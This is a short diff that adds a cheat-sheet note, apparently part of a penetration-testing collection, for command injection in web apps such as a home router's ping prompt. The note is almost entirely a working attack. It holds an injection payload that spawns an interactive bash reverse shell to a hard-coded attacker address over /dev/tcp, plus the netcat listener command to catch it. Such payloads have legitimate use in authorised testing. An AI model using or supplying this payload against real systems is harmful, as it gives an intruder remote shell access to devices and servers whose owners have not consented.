@@ -1,0 +1,7 @@
+# useful for web app command injection
+# i.e. a ping prompt on a soho router
+
+192.168.1.1 && |/bin/bash -i > /dev/tcp/10.20.30.40/4444 0<&1 2>&1
+
+# on 10.20.30.40 attacker box
+nc -nlvp 4444
